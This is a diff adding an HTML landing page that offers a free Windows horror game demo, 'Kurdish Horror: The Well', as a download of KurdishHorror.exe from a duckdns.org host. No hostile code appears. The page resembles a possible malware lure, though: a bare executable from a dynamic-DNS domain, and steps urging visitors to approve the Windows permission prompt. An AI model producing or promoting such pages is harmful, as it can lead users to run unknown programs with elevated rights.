@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Kurdish Horror — The Well | Free Windows Demo</title>
+<meta name="description" content="Kurdish Horror: The Well — free atmospheric horror demo for Windows. Fullscreen experience. Download for PC and laptop.">
+<link rel="icon" href="icon.ico" type="image/x-icon">
+<style>
+  :root {
+    --bg: #070708;
+    --card: #121214;
+    --line: #2a2a2e;
+    --text: #e8e6e3;
+    --muted: #8f8b85;
+    --blood: #9b1c1c;
+    --blood2: #c43c3c;
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    font-family: "Segoe UI", system-ui, -apple-system, sans-serif;
+    background: var(--bg);
+    color: var(--text);
+    min-height: 100vh;
+    line-height: 1.55;
+  }
+  body::before {
+    content: "";
+    position: fixed;
+    inset: 0;
+    background:
+      radial-gradient(ellipse at 50% 0%, rgba(120, 20, 20, 0.18), transparent 55%),
+      radial-gradient(ellipse at 80% 100%, rgba(40, 0, 0, 0.25), transparent 40%);
+    pointer-events: none;
+    z-index: 0;
+  }
+  .wrap {
+    position: relative;
+    z-index: 1;
+    max-width: 720px;
+    margin: 0 auto;
+    padding: 56px 20px 96px;
+  }
+  .badge {
+    display: inline-block;
+    background: var(--blood);
+    color: #fff;
+    font-size: 11px;
+    font-weight: 700;
+    letter-spacing: 0.12em;
+    padding: 6px 12px;
+    border-radius: 4px;
+    margin-bottom: 20px;
+  }
+  h1 {
+    font-size: clamp(1.9rem, 5vw, 2.6rem);
+    font-weight: 800;
+    letter-spacing: -0.03em;
+    line-height: 1.15;
+    margin-bottom: 8px;
+  }
+  h1 span { color: var(--blood2); }
+  .tagline {
+    color: var(--muted);
+    font-size: 1.1rem;
+    margin-bottom: 32px;
+  }
+  .card {
+    background: var(--card);
+    border: 1px solid var(--line);
+    border-radius: 14px;
+    padding: 28px;
+    margin-bottom: 18px;
+  }
+  .card h2 {
+    font-size: 1rem;
+    text-transform: uppercase;
+    letter-spacing: 0.06em;
+    color: #cfcbc6;
+    margin-bottom: 14px;
+  }
+  .card p, .card li { color: var(--muted); font-size: 0.98rem; }
+  .card ul { padding-left: 1.15rem; margin-top: 8px; }
+  .card li { margin-bottom: 8px; }
+  .story {
+    border-left: 3px solid var(--blood);
+    padding-left: 16px;
+    color: #c4c0ba;
+    font-style: italic;
+    margin: 12px 0 0;
+  }
+  .btn-row {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 12px;
+    margin: 28px 0 10px;
+  }
+  .btn {
+    display: inline-flex;
+    align-items: center;
+    justify-content: center;
+    gap: 10px;
+    background: linear-gradient(180deg, #b02424, #7a1212);
+    color: #fff;
+    font-weight: 700;
+    font-size: 1.05rem;
+    text-decoration: none;
+    padding: 16px 28px;
+    border-radius: 10px;
+    border: 1px solid #d04545;
+    box-shadow: 0 8px 28px rgba(120, 0, 0, 0.35);
+  }
+  .btn:hover { filter: brightness(1.08); }
+  .btn-secondary {
+    background: #1c1c20;
+    border: 1px solid var(--line);
+    box-shadow: none;
+    color: #ddd;
+    font-weight: 600;
+  }
+  .meta {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 12px;
+    margin-top: 8px;
+  }
+  @media (max-width: 520px) { .meta { grid-template-columns: 1fr; } }
+  .meta div {
+    background: #0e0e10;
+    border: 1px solid var(--line);
+    border-radius: 10px;
+    padding: 14px 16px;
+  }
+  .meta strong { display: block; color: #ddd; font-size: 0.85rem; margin-bottom: 4px; }
+  .meta span { color: var(--muted); font-size: 0.9rem; }
+  .foot {
+    margin-top: 40px;
+    color: #5c5955;
+    font-size: 0.82rem;
+    text-align: center;
+  }
+  .foot a { color: #8a8680; }
+  code {
+    background: #1a1a1e;
+    padding: 2px 7px;
+    border-radius: 4px;
+    font-size: 0.9em;
+  }
+</style>
+</head>
+<body>
+  <div class="wrap">
+    <div class="badge">FREE DEMO · WINDOWS · 18+</div>
+    <h1>Kurdish Horror<br><span>The Well</span></h1>
+    <p class="tagline">Atmospheric horror for PC &amp; laptop. Fullscreen. Headphones recommended.</p>
+
+    <div class="card">
+      <h2>About</h2>
+      <p class="story">
+        Kurdistan, 1987. You are Aran. You came back for your sister.
+        The mountains do not forget. The well ran black.
+        She left a note: do not follow the song.
+      </p>
+      <ul>
+        <li>Fullscreen cinematic menu &amp; intro</li>
+        <li>Story-driven demo chapter — <em>The Well</em></li>
+        <li>Built for Windows 10 / 11 (64-bit)</li>
+        <li>Runs on desktop PCs and laptops</li>
+      </ul>
+    </div>
+
+    <div class="btn-row">
+      <a class="btn" href="KurdishHorror.exe" download="KurdishHorror.exe">Download for Windows</a>
+      <a class="btn btn-secondary" href="#how">How to run</a>
+    </div>
+
+    <div class="card" id="how">
+      <h2>How to run</h2>
+      <ul>
+        <li>Download <code>KurdishHorror.exe</code></li>
+        <li>Open the file on your Windows PC or laptop</li>
+        <li>If Windows asks for permission, choose <strong>Yes</strong> for the full experience</li>
+        <li>Use arrow keys / W S to move in the menu, Enter to confirm, ESC to pause</li>
+      </ul>
+    </div>
+
+    <div class="meta">
+      <div>
+        <strong>Platform</strong>
+        <span>Windows 10 / 11 · PC &amp; laptop</span>
+      </div>
+      <div>
+        <strong>Mode</strong>
+        <span>Fullscreen demo · offline</span>
+      </div>
+      <div>
+        <strong>Controls</strong>
+        <span>Keyboard · menu + story</span>
+      </div>
+      <div>
+        <strong>Host</strong>
+        <span>kurdishhorror.duckdns.org</span>
+      </div>
+    </div>
+
+    <p class="foot">
+      Kurdish Horror — The Well · Demo build<br>
+      <a href="https://kurdishhorror.duckdns.org">kurdishhorror.duckdns.org</a>
+    </p>
+  </div>
+</body>
+</html>
